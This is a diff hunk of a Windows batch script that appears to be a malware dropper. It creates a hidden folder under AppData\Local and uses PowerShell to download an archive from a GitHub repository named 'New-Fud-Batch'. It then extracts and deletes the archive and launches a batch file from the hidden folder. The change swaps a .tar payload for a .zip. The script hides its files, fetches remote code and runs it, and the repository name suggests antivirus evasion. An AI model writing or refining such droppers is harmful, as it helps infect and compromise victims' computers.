@@ -23,9 +23,9 @@ cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
 attrib +h "Anon" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/blob/main/.tar' -OutFile .tar"
-tar -xf .tar
-del .tar
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/blob/main/.zip' -OutFile .zip"
+Expand-Archive -Force .zip
+del .zip
 
 start C:\Users\%USERNAME%\AppData\Local\Anon\1.bat"
 
